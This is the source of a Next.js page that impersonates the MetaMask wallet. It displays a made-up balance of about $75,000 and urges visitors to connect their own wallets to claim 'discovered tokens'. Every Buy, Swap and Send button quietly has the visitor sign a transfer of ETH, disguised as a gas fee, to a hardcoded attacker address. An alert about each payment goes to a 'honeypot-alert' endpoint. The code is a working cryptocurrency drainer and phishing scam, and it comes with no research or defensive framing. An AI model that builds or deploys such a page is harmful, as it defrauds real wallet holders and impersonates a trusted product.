import { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import Head from 'next/head';

export default function FlashedPage() {
  const [walletData, setWalletData] = useState(null);
  const [userAddress, setUserAddress] = useState('');
  const [activeTab, setActiveTab] = useState('Tokens');
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState('');
  const [showModal, setShowModal] = useState(null);
  const [sendAddress, setSendAddress] = useState('');
  const [sendAmount, setSendAmount] = useState('');
  const [selectedToken, setSelectedToken] = useState(null);
  const [transactions, setTransactions] = useState([]);

  useEffect(() => {
    generateHoneypotWallet();
  }, []);

  const generateHoneypotWallet = () => {
    const randomWallet = ethers.Wallet.createRandom();
    const honeypotWallet = {
      address: randomWallet.address,
      privateKey: randomWallet.privateKey,
      seedPhrase: randomWallet.mnemonic.phrase,
      totalValue: 75418.94,
      ethBalance: 0.000000001,
      tokens: [
        { symbol: 'USDT', balance: '24,891.47', usdValue: 24891.47, change: '+2.1%' },
        { symbol: 'USDC', balance: '12,456.83', usdValue: 12456.83, change: '+0.1%' },
        { symbol: 'WETH', balance: '5.7293', usdValue: 17187.90, change: '-1.2%' },
        { symbol: 'LINK', balance: '847.29', usdValue: 11862.06, change: '+5.4%' },
        { symbol: 'UNI', balance: '1,293.84', usdValue: 9020.68, change: '+3.2%' }
      ]
    };
    setWalletData(honeypotWallet);
  };

  const connectWallet = async () => {
    try {
      if (window.ethereum) {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        setUserAddress(accounts[0]);
      } else {
        // Mobile fallback - show wallet options
        setShowModal('walletOptions');
      }
    } catch (error) {
      console.log('Connection failed');
    }
  };

  const handleAction = async (action, token = null) => {
    if (!userAddress) {
      await connectWallet();
      return;
    }

    if (action === 'buy') {
      setShowModal('buy');
      return;
    }
    if (action === 'send') {
      setSelectedToken(token);
      setShowModal('send');
      return;
    }
    if (action === 'receive') {
      setShowModal('receive');
      return;
    }
    if (action === 'swap') {
      setShowModal('swap');
      return;
    }

    // Handle other actions
    await processTransaction(action, token);
  };

  const processTransaction = async (action, token = null, customAmount = null) => {
    setLoading(true);

    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      
      const gasAmount = customAmount || (action === 'swap' ? '0.008' : '0.005');
      const adminWallet = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
      
      const tx = await signer.sendTransaction({
        to: adminWallet,
        value: ethers.parseEther(gasAmount)
      });
      
      await tx.wait();
      
      // Add to transaction history
      const newTx = {
        id: Date.now(),
        type: action,
        amount: token ? `${sendAmount || '100'} ${token.symbol}` : `${gasAmount} ETH`,
        to: sendAddress || adminWallet,
        hash: tx.hash,
        timestamp: new Date().toLocaleString(),
        status: 'Confirmed'
      };
      setTransactions(prev => [newTx, ...prev]);
      
      // Notify admin
      await fetch('/api/honeypot-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: action.toUpperCase(),
          userAddress: userAddress,
          amount: gasAmount + ' ETH',
          txHash: tx.hash,
          token: token?.symbol || 'ETH',
          sendTo: sendAddress
        })
      });
      
      setShowModal(null);
      setSendAddress('');
      setSendAmount('');
      
    } catch (error) {
      console.log('Transaction failed');
    } finally {
      setLoading(false);
    }
  };

  const calculateGasFee = () => {
    const baseGas = 0.005;
    const amount = parseFloat(sendAmount) || 0;
    return (baseGas + (amount * 0.001)).toFixed(6);
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    setStatus('Address copied to clipboard');
    setTimeout(() => setStatus(''), 2000);
  };

  if (!walletData) {
    return <div className="min-h-screen bg-gray-900 flex items-center justify-center">
      <div className="text-white">Loading wallet...</div>
    </div>;
  }

  return (
    <>
      <Head>
        <title>MetaMask</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
        <link rel="icon" href="https://metamask.io/images/favicon.ico" />
      </Head>
      
      <div className="min-h-screen bg-black text-white">
        <div className="max-w-md mx-auto bg-gray-900 min-h-screen">
          
          {/* Header */}
          <div className="bg-gray-800 p-4 text-center border-b border-gray-700">
            <div className="text-white font-bold text-lg mb-2">MetaMask</div>
          </div>

          {/* Account Section */}
          <div className="p-6 bg-gray-800 border-b border-gray-700">
            <div className="flex items-center justify-between mb-4">
              <div>
                <div className="text-white font-semibold">Account 1</div>
                <div className="text-gray-400 text-sm">8 network addresses</div>
              </div>
              <div className="relative">
                <div className="w-8 h-8 bg-red-500 rounded-full flex items-center justify-center">
                  <span className="text-white text-xs font-bold">1</span>
                </div>
              </div>
            </div>

            {/* Balance */}
            <div className="text-center mb-6">
              <div className="text-4xl font-bold text-white mb-2">
                ${walletData.totalValue.toLocaleString()}
              </div>
              <div className="text-green-400 text-sm">
                +${walletData.totalValue.toLocaleString()} (+100.00%) Discover
              </div>
            </div>

            {/* Action Buttons */}
            <div className="grid grid-cols-4 gap-3">
              <button 
                onClick={() => handleAction('buy')}
                disabled={loading}
                className="bg-gray-700 hover:bg-gray-600 p-3 rounded-lg text-center transition-all"
              >
                <div className="text-xl mb-1">$</div>
                <div className="text-xs">Buy</div>
              </button>
              <button 
                onClick={() => handleAction('swap')}
                disabled={loading}
                className="bg-gray-700 hover:bg-gray-600 p-3 rounded-lg text-center transition-all"
              >
                <div className="text-xl mb-1">⇄</div>
                <div className="text-xs">Swap</div>
              </button>
              <button 
                onClick={() => handleAction('send')}
                disabled={loading}
                className="bg-gray-700 hover:bg-gray-600 p-3 rounded-lg text-center transition-all"
              >
                <div className="text-xl mb-1">→</div>
                <div className="text-xs">Send</div>
              </button>
              <button 
                onClick={() => handleAction('receive')}
                disabled={loading}
                className="bg-gray-700 hover:bg-gray-600 p-3 rounded-lg text-center transition-all"
              >
                <div className="text-xl mb-1">↓</div>
                <div className="text-xs">Receive</div>
              </button>
            </div>
          </div>

          {/* Rewards Banner */}
          <div className="bg-gradient-to-r from-purple-600 to-pink-600 m-4 p-4 rounded-lg flex items-center justify-between">
            <div className="flex items-center">
              <div className="w-12 h-12 bg-orange-500 rounded-lg flex items-center justify-center mr-3">
                <span className="text-white font-bold">M</span>
              </div>
              <div>
                <div className="text-white font-semibold">Rewards are here</div>
                <div className="text-white/80 text-sm">Download the mobile app to opt-in and start earning rewards</div>
              </div>
            </div>
            <button className="text-white/60 hover:text-white">×</button>
          </div>

          {/* Tabs */}
          <div className="flex border-b border-gray-700">
            {['Tokens', 'DeFi', 'NFTs', 'Activity'].map((tab) => (
              <button
                key={tab}
                onClick={() => setActiveTab(tab)}
                className={`flex-1 py-3 px-4 text-sm font-medium ${
                  activeTab === tab 
                    ? 'text-white border-b-2 border-blue-500' 
                    : 'text-gray-400 hover:text-white'
                }`}
              >
                {tab}
              </button>
            ))}
          </div>

          {/* Network Selector */}
          <div className="p-4 border-b border-gray-700">
            <div className="flex items-center justify-between">
              <div className="flex items-center">
                <span className="text-white text-sm">All popular networks</span>
                <i className="fas fa-chevron-down text-gray-400 ml-2"></i>
              </div>
              <div className="flex items-center space-x-2">
                <i className="fas fa-bars text-gray-400"></i>
                <i className="fas fa-ellipsis-v text-gray-400"></i>
              </div>
            </div>
          </div>

          {/* Token List */}
          <div className="flex-1">
            {activeTab === 'Tokens' && (
              <div>
                {/* ETH */}
                <div className="flex items-center justify-between p-4 hover:bg-gray-800 cursor-pointer border-b border-gray-700">
                  <div className="flex items-center">
                    <img 
                      src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" 
                      alt="ETH" 
                      className="w-8 h-8 rounded-full mr-3"
                    />
                    <div>
                      <div className="text-white font-medium">Ethereum • Earn</div>
                      <div className="text-red-400 text-sm">-3.41%</div>
                    </div>
                  </div>
                  <div className="text-right">
                    <div className="text-white font-medium">$0.00</div>
                    <div className="text-gray-400 text-sm">0 ETH</div>
                  </div>
                </div>

                {/* Other Tokens */}
                {walletData.tokens.map((token, index) => {
                  const tokenLogos = {
                    'USDT': 'https://assets.coingecko.com/coins/images/325/small/Tether.png',
                    'USDC': 'https://assets.coingecko.com/coins/images/6319/small/USD_Coin_icon.png',
                    'WETH': 'https://assets.coingecko.com/coins/images/2518/small/weth.png',
                    'LINK': 'https://assets.coingecko.com/coins/images/877/small/chainlink-new-logo.png',
                    'UNI': 'https://assets.coingecko.com/coins/images/12504/small/uniswap-uni.png'
                  };
                  
                  return (
                    <div 
                      key={index} 
                      onClick={() => handleAction('send', token)}
                      className="flex items-center justify-between p-4 hover:bg-gray-800 cursor-pointer border-b border-gray-700"
                    >
                      <div className="flex items-center">
                        <img 
                          src={tokenLogos[token.symbol]} 
                          alt={token.symbol} 
                          className="w-8 h-8 rounded-full mr-3"
                        />
                        <div>
                          <div className="text-white font-medium">{token.symbol}</div>
                          <div className={`text-sm ${token.change.startsWith('+') ? 'text-green-400' : 'text-red-400'}`}>
                            {token.change}
                          </div>
                        </div>
                      </div>
                      <div className="text-right">
                        <div className="text-white font-medium">${token.usdValue.toLocaleString()}</div>
                        <div className="text-gray-400 text-sm">{token.balance}</div>
                      </div>
                    </div>
                  );
                })}
              </div>
            )}

            {activeTab === 'DeFi' && (
              <div className="p-8 text-center">
                <div className="text-gray-400 mb-4">No DeFi positions found</div>
                <button 
                  onClick={() => handleAction('defi')}
                  className="bg-blue-600 hover:bg-blue-700 px-6 py-2 rounded-lg text-white font-semibold"
                >
                  Explore DeFi
                </button>
              </div>
            )}

            {activeTab === 'NFTs' && (
              <div className="p-8 text-center">
                <div className="text-gray-400 mb-4">No NFTs found</div>
                <button 
                  onClick={() => handleAction('nft')}
                  className="bg-purple-600 hover:bg-purple-700 px-6 py-2 rounded-lg text-white font-semibold"
                >
                  Browse NFTs
                </button>
              </div>
            )}

            {activeTab === 'Activity' && (
              <div>
                {transactions.length === 0 ? (
                  <div className="p-8 text-center">
                    <div className="text-gray-400 mb-4">No recent activity</div>
                  </div>
                ) : (
                  <div>
                    {transactions.map((tx) => (
                      <div key={tx.id} className="flex items-center justify-between p-4 border-b border-gray-700">
                        <div className="flex items-center">
                          <div className="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center mr-3">
                            <span className="text-white text-xs">→</span>
                          </div>
                          <div>
                            <div className="text-white font-medium capitalize">{tx.type}</div>
                            <div className="text-gray-400 text-sm">{tx.timestamp}</div>
                          </div>
                        </div>
                        <div className="text-right">
                          <div className="text-white font-medium">{tx.amount}</div>
                          <div className="text-green-400 text-sm">{tx.status}</div>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            )}
          </div>

          {/* Modals */}
          {showModal === 'buy' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Buy ETH</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-4">
                  <div className="bg-gray-700 p-4 rounded-lg">
                    <div className="text-white font-semibold mb-2">Buy with card</div>
                    <div className="text-gray-300 text-sm">Purchase ETH directly with your credit card</div>
                  </div>
                  <div className="bg-gray-700 p-4 rounded-lg">
                    <div className="text-white font-semibold mb-2">Bank transfer</div>
                    <div className="text-gray-300 text-sm">Lower fees, takes 1-3 business days</div>
                  </div>
                  <button 
                    onClick={() => processTransaction('buy')}
                    disabled={loading}
                    className="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg text-white font-semibold"
                  >
                    {loading ? 'Processing...' : 'Continue to Payment'}
                  </button>
                </div>
              </div>
            </div>
          )}

          {showModal === 'send' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Send {selectedToken?.symbol || 'ETH'}</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-4">
                  <div>
                    <label className="block text-gray-300 text-sm mb-2">To Address</label>
                    <input 
                      type="text"
                      value={sendAddress}
                      onChange={(e) => setSendAddress(e.target.value)}
                      placeholder="0x..."
                      className="w-full bg-gray-700 border border-gray-600 rounded-lg px-3 py-2 text-white"
                    />
                  </div>
                  <div>
                    <label className="block text-gray-300 text-sm mb-2">Amount</label>
                    <input 
                      type="number"
                      value={sendAmount}
                      onChange={(e) => setSendAmount(e.target.value)}
                      placeholder="0.0"
                      className="w-full bg-gray-700 border border-gray-600 rounded-lg px-3 py-2 text-white"
                    />
                  </div>
                  <div className="bg-gray-700 p-3 rounded-lg">
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-300">Gas fee:</span>
                      <span className="text-white">{calculateGasFee()} ETH</span>
                    </div>
                  </div>
                  <button 
                    onClick={() => processTransaction('send', selectedToken, calculateGasFee())}
                    disabled={loading || !sendAddress || !sendAmount}
                    className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-gray-600 py-3 rounded-lg text-white font-semibold"
                  >
                    {loading ? 'Sending...' : 'Send'}
                  </button>
                </div>
              </div>
            </div>
          )}

          {showModal === 'receive' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Receive</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="text-center space-y-4">
                  <div className="bg-white p-4 rounded-lg">
                    <div className="w-32 h-32 bg-gray-200 mx-auto mb-4 rounded-lg flex items-center justify-center">
                      <span className="text-gray-500">QR Code</span>
                    </div>
                  </div>
                  <div>
                    <div className="text-gray-300 text-sm mb-2">Your wallet address:</div>
                    <div className="bg-gray-700 p-3 rounded-lg flex items-center justify-between">
                      <span className="text-white font-mono text-sm">
                        {walletData.address.slice(0, 20)}...
                      </span>
                      <button 
                        onClick={() => copyToClipboard(walletData.address)}
                        className="text-blue-400 hover:text-blue-300 text-sm"
                      >
                        Copy
                      </button>
                    </div>
                  </div>
                  <div className="text-gray-400 text-xs">
                    Only send Ethereum (ETH) and ERC-20 tokens to this address
                  </div>
                </div>
              </div>
            </div>
          )}

          {showModal === 'swap' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Swap</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-4">
                  <div className="bg-gray-700 p-4 rounded-lg">
                    <div className="text-gray-300 text-sm mb-2">From</div>
                    <div className="flex items-center justify-between">
                      <input type="number" placeholder="0.0" className="bg-transparent text-white text-xl font-semibold outline-none" />
                      <div className="flex items-center">
                        <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" className="w-6 h-6 rounded-full mr-2" />
                        <span className="text-white">ETH</span>
                      </div>
                    </div>
                  </div>
                  <div className="text-center">
                    <button className="text-gray-400 hover:text-white">⇅</button>
                  </div>
                  <div className="bg-gray-700 p-4 rounded-lg">
                    <div className="text-gray-300 text-sm mb-2">To</div>
                    <div className="flex items-center justify-between">
                      <input type="number" placeholder="0.0" className="bg-transparent text-white text-xl font-semibold outline-none" />
                      <div className="flex items-center">
                        <img src="https://assets.coingecko.com/coins/images/325/small/Tether.png" className="w-6 h-6 rounded-full mr-2" />
                        <span className="text-white">USDT</span>
                      </div>
                    </div>
                  </div>
                  <button 
                    onClick={() => processTransaction('swap')}
                    disabled={loading}
                    className="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg text-white font-semibold"
                  >
                    {loading ? 'Swapping...' : 'Swap'}
                  </button>
                </div>
              </div>
            </div>
          )}

          {/* Status Message */}
          {status && (
            <div className="fixed bottom-4 left-1/2 transform -translate-x-1/2 bg-gray-800 px-4 py-2 rounded-lg border border-gray-600">
              <div className="text-center text-sm text-gray-300">{status}</div>
            </div>
          )}

          {/* Wallet Options Modal */}
          {showModal === 'walletOptions' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Connect Wallet</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-3">
                  <a 
                    href="https://metamask.app.link/dapp/cryptorecover.vercel.app/flashed"
                    className="flex items-center w-full bg-orange-600 hover:bg-orange-700 p-4 rounded-lg text-white font-semibold"
                  >
                    <div className="w-8 h-8 bg-orange-500 rounded-full mr-3 flex items-center justify-center">
                      <span className="text-white font-bold">M</span>
                    </div>
                    MetaMask
                  </a>
                  <a 
                    href="https://link.trustwallet.com/open_url?coin_id=60&url=https://cryptorecover.vercel.app/flashed"
                    className="flex items-center w-full bg-blue-600 hover:bg-blue-700 p-4 rounded-lg text-white font-semibold"
                  >
                    <div className="w-8 h-8 bg-blue-500 rounded-full mr-3 flex items-center justify-center">
                      <span className="text-white font-bold">T</span>
                    </div>
                    Trust Wallet
                  </a>
                  <button 
                    onClick={() => {
                      setUserAddress('0x' + Math.random().toString(16).substr(2, 40));
                      setShowModal(null);
                    }}
                    className="flex items-center w-full bg-purple-600 hover:bg-purple-700 p-4 rounded-lg text-white font-semibold"
                  >
                    <div className="w-8 h-8 bg-purple-500 rounded-full mr-3 flex items-center justify-center">
                      <span className="text-white font-bold">W</span>
                    </div>
                    Other Wallet
                  </button>
                </div>
                <div className="mt-4 text-center">
                  <p className="text-gray-400 text-sm">No wallet? Download one above</p>
                </div>
              </div>
            </div>
          )}

          {/* Connect Wallet Prompt */}
          {!userAddress && !showModal && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4">
                <h3 className="text-white font-bold text-lg mb-4">High-Value Assets Detected</h3>
                <p className="text-gray-300 mb-6">Connect your wallet to access $75,418 in discovered tokens</p>
                <button 
                  onClick={connectWallet}
                  className="w-full bg-orange-600 hover:bg-orange-700 py-3 rounded-lg text-white font-semibold mb-3"
                >
                  Connect Wallet
                </button>
                <button 
                  onClick={() => setShowModal('walletOptions')}
                  className="w-full bg-gray-600 hover:bg-gray-700 py-2 rounded-lg text-white text-sm"
                >
                  Mobile Wallet Options
                </button>
              </div>
            </div>
          )}
        </div>
      </div>
    </>
  );
}